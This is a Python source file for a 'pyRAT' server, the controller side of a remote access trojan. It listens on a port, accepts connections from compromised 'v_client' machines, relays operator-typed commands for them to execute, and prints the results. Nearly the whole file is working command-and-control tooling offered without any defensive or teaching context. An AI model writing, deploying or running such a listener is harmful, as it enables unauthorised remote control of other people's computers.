"""
Simple pyRAT server

Usage: v_server.py -p PORT

Notes: Listen for remote connections on port, send commands to remote v_client

"""


import sys
import socket
import argparse
import threading


# Global Variables
clients = {}


def serve_client(client):
    try:
        # get command to be executed on v_clients machine
        print("Enter a command to execute: ")
        user_input = sys.stdin.read()
        client.send(user_input)

        while True:
            # wait for data from listener
            received_data = client.recv(4096)

            print(received_data)

            # wait for more input
            user_input = input("")
            user_input += "\n"
            client.send(user_input)
    except:
        print("[-] Client closed connection...")
        pass


def server_listen(port_number):

    target_host = "0.0.0.0"

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((target_host, port_number))

    # listen for max of 25 lines
    listener.listen(25)
    print("[+] Server is listening on port ", str(port_number), "...")
    while True:
        client, address = listener.accept()
        print("[+] Incoming Connection from %s:%d" % (address[0], address[1]))
        clients[address[0]] = client
        client_serve_thread = threading.Thread(target=serve_client, args=(client,))
        client_serve_thread.start()


def parse():
    parser = argparse.ArgumentParser("v_server")
    parser.add_argument("-p", "--port", type=int, help="port to connect with", default=9999)
    args = parser.parse_args()
    port_number = args.port
    return port_number


def main():
    port_number = parse()
    server_listen(port_number)


if __name__ == '__main__':
    # call the main function
    main()
